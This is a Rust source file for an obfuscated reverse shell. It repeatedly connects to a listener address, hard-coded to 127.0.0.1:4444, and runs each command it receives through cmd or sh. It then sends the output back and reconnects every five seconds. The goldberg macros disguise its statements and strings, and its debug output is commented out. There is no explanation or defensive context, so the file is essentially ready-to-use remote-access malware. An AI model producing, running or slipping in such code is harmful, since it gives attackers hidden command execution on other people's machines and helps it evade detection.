use goldberg::*;
use tokio::io::{self, AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::process::Command;
use tokio::time::{sleep, Duration};

goldberg_stmts! {
    async fn connect_and_run(addr: &str) -> io::Result<()> {
        loop {
            match TcpStream::connect(addr).await {
                Ok(mut stream) => {
                    // println!("Connected to {}", addr);
                    let mut buffer = [0; 512];

                    loop {
                        let bytes_read = goldberg_stmts! {
                            match stream.read(&mut buffer).await {
                                Ok(n) if n == 0 => {
                                    // eprintln!("Connection closed by server");
                                    break;
                                }
                                Ok(n) => n,
                                Err(_) => {
                                    // eprintln!("Failed to read from socket: {}", e);
                                    break;
                                }
                            }
                        };

                        let command = String::from_utf8_lossy(&buffer[..bytes_read]);
                        let command = command.trim();

                        let output = goldberg_stmts! {
                            if cfg!(target_os = "windows") {
                                Command::new(goldberg_string!("cmd")).args(&[goldberg_string!("/C"), command]).output().await?
                            } else {
                                Command::new(goldberg_string!("sh")).arg(goldberg_string!("-c")).arg(command).output().await?
                            }
                        };

                        stream.write_all(&output.stdout).await?;
                        stream.write_all(&output.stderr).await?;
                    }
                }
                Err(_) => ()
            }

            // println!("Reconnecting in 5 seconds...");
            sleep(Duration::from_secs(5)).await;
        }
    }
}

#[tokio::main]
async fn main() -> io::Result<()> {
    let addr = goldberg_string!("127.0.0.1:4444").to_string();
    connect_and_run(&addr[..]).await
}
